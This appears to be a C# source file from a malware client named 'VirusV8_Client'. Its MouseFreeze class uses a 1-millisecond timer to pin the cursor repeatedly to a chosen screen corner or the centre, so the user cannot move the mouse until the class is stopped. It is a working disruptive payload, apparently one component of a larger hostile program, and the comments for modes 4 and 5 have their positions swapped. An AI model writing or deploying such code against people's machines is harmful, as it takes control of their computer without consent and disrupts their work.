using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Threading.Tasks;

namespace VirusV8_Client
{
    class MouseFreeze

    {
        int Mode;
        Timer t;
        public MouseFreeze(int Modus)
        {
            Mode = Modus;
            Timer t = new Timer();
            t.Interval = 1;
            t.Tick += T_Tick;
            t.Enabled = true;
            this.t = t;
        }

        private void T_Tick(object sender, EventArgs e)
        {
            if(Mode == 1)//Unten Rechts
            {
                Cursor.Position = new System.Drawing.Point(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height); 
            }
            else
            if (Mode == 2)//Oben Rechts
            {
                Cursor.Position = new System.Drawing.Point(Screen.PrimaryScreen.Bounds.Width, 0);

            }
            else
            if (Mode == 3)//Mitte
            {
                Cursor.Position = new System.Drawing.Point(Screen.PrimaryScreen.Bounds.Width/2, Screen.PrimaryScreen.Bounds.Height/2);

            }
            else
            if (Mode == 4)//Oben Links
            {
                Cursor.Position = new System.Drawing.Point(0, Screen.PrimaryScreen.Bounds.Height);

            }
            else
            if (Mode == 5)//Unten Links
            {
                Cursor.Position = new System.Drawing.Point(0, 0);

            }
        }

        public void Stop()
        {
            t.Enabled = false;
        }
    }
}
